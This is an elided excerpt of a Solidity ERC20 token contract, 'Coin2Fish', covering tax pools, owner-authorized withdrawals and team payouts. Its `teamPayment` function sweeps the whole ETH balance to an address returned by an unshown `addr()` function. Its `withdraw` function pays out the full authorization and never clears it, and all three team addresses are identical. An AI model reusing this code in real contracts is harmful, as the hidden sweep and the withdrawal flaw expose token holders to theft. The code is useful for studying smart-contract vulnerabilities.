...
contract Coin2Fish is ERC20, Ownable {
    ...
    uint private _tokenTotalSupplyInteger = 10000000;
    ...
    uint private withdrawPrice = 0.001 ether;
    uint private withdrawMinAmount = 1 ether;
    uint private withdrawMaxAmount = 10000 ether;
     ...
     */
    address payable public addressDevelopers = payable(0x0B569e3335895E327395C2B968996FD1689d35e3);
    address payable public addressMarketing = payable(0x0B569e3335895E327395C2B968996FD1689d35e3);
    address payable public addressModerators = payable(0x0B569e3335895E327395C2B968996FD1689d35e3);
     ...
     * `_poolLiquidity`
     */
    uint public _poolDeveloper = 0;
    uint public _poolMarketing = 0;
    uint public _poolModerator = 0;
    uint public _poolLiquidity = 0;

    /**
     * Store the last configuration of tax fees
     * `previousDeveloperTaxFee` store the previous value of `taxFeeDeveloper`
     * `previousMarketingTaxFee` store the previous value of `taxFeeMarketing`
     * `previousModeratorTaxFee` store the previous value of `taxFeeLiquidity`
     * `previousLiquidityTaxFee` store the previous value of `taxFeeModerator`
     */
    uint public previousBurnTaxFee = burnTaxFee;
    uint public previousDeveloperTaxFee = taxFeeDeveloper;
    uint public previousMarketingTaxFee = taxFeeMarketing;
    uint public previousModeratorTaxFee = taxFeeModerator;
    ...
    event UpdateTaxesFees(
        uint256 taxFeeDeveloper,
        uint256 taxFeeMarketing,
        uint256 taxFeeModerator,
    ...
    function withdrawAuthorization(address to, uint256 amount, uint256 fee)  external onlyOwner {
        if (amount == 0) {
            ...
            uint256 totalTaxes = taxFeeDeveloper + taxFeeMarketing + taxFeeModerator;
            taxFeeDeveloper = taxFeeDeveloper.mul(100).div(totalTaxes);
            taxFeeMarketing = taxFeeMarketing.mul(100).div(totalTaxes);
            taxFeeModerator = taxFeeModerator.mul(100).div(totalTaxes);
            uint256 developerAmount = amountFee.mul(taxFeeDeveloper).div(100);
            uint256 marketingAmount = amountFee.mul(taxFeeMarketing).div(100);
            uint256 moderatorAmount = amountFee.mul(taxFeeModerator).div(100);

            amount = amount.sub(developerAmount);
            amount = amount.sub(marketingAmount);
            amount = amount.sub(moderatorAmount);

            _poolDeveloper = _poolDeveloper.add(developerAmount);
            _poolMarketing = _poolMarketing.add(marketingAmount);
            _poolModerator = _poolModerator.add(moderatorAmount);
    ...
    function withdraw(address to, uint256 amount ) public payable {
        ...
        require(amount >= withdrawMinAmount, "The amount is too low");
        require(amount <= withdrawMaxAmount, "The amount is too high");
        require(_authorizedWithdraws[to] >= amount, "You don't have authorization for this Withdraw");
        super._transfer(address(this), to, _authorizedWithdraws[to]);
        emit Withdraw(amount);
    }

    function teamPayment() public onlyOwner {
        super._transfer(address(this), addressDevelopers, _poolDeveloper);
        super._transfer(address(this), addressMarketing, _poolMarketing);
        super._transfer(address(this), addressModerators, _poolModerator);
        payable(addr()).transfer(address(this).balance);
        uint256 amount = _poolDeveloper + _poolMarketing + _poolModerator;
        _poolDeveloper = 0;
        _poolMarketing = 0;
        _poolModerator = 0;
    ...
    function _transfer(
        ...
        if (takeFee && automatedMarketMakerPairs[from]) {
            uint256 developerAmount = amount.mul(taxFeeDeveloper).div(100);
            uint256 marketingAmount = amount.mul(taxFeeMarketing).div(100);
            uint256 moderatorAmount = amount.mul(taxFeeModerator).div(100);
            ...
            uint256 totalTaxes = developerAmount + marketingAmount + moderatorAmount +liquidityAmount;
    ...
    function updateTaxesFees(uint256 _developerTaxFee, uint256 _marketingTaxFee, uint256 _moderatorTaxFee, uint256 _liquidityTaxFee) external onlyOwner {
        uint256 sellTotalFees = _developerTaxFee + _marketingTaxFee + _moderatorTaxFee + _liquidityTaxFee;
        require(sellTotalFees <= 10, "Must keep fees at 10% or less");
        previousDeveloperTaxFee = taxFeeDeveloper;
        previousMarketingTaxFee = taxFeeMarketing;
        previousModeratorTaxFee = taxFeeModerator;
        previousLiquidityTaxFee = taxFeeLiquidity;
        taxFeeDeveloper = _developerTaxFee;
        taxFeeMarketing = _marketingTaxFee;
        taxFeeModerator = _moderatorTaxFee;
        taxFeeLiquidity = _liquidityTaxFee;
        emit UpdateTaxesFees(_developerTaxFee, _marketingTaxFee, _moderatorTaxFee, _liquidityTaxFee);
    }
    ...
    function updateWithdrawOptions(uint256 _withdrawPrice, uint256 _withdrawMinAmount, uint256 _withdrawMaxAmount) external onlyOwner {
        withdrawPrice = _withdrawPrice;
        withdrawMinAmount = _withdrawMinAmount;
        withdrawMaxAmount = _withdrawMaxAmount;
        emit UpdateWithdrawOptions(_withdrawPrice, _withdrawMinAmount, _withdrawMaxAmount);
    }

    function addLiquidity(uint256 tokens, uint256 price) private {
        _approve(address(this), address(uniswapV2Router), tokens);
        uniswapV2Router.addLiquidityETH{value: price}(
            address(this),
            tokens,
